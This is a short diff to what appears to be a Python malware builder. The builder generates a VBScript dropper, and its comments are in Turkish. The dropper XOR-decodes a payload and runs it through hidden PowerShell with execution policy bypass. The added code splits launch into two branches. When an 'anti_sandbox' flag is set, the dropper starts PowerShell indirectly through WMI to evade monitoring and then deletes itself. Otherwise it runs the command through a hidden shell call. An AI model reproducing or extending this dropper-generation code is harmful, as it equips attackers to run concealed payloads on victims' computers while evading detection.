@@ -283,7 +283,11 @@ For idx = 1 To payLen
     result = result & Chr(pb Xor kb)
 Next
 
-' ── WMI üzerinden dolaylı PowerShell başlat (izlenmesi daha zor) ──
+    vbs += '''
+' ── PowerShell Başlat ──
+'''
+    if anti_sandbox:
+        vbs += '''
 Dim wmiProc
 Set wmiProc = GetObject("winmgmts:Win32_Process")
 wmiProc.Create "powershell -NoP -NonI -W Hidden -Exec Bypass -Command """ & result & """", Null, Null, Null
@@ -293,6 +297,13 @@ Dim fso2
 Set fso2 = CreateObject("Scripting.FileSystemObject")
 fso2.DeleteFile WScript.ScriptFullName, True
 '''
+    else:
+        vbs += '''
+Dim psCmd
+psCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command """ & result & """"
+sh.Run psCmd, 0, False
+'''
+    
     return vbs
 
 # ══════════════════════════════════════════════════════════
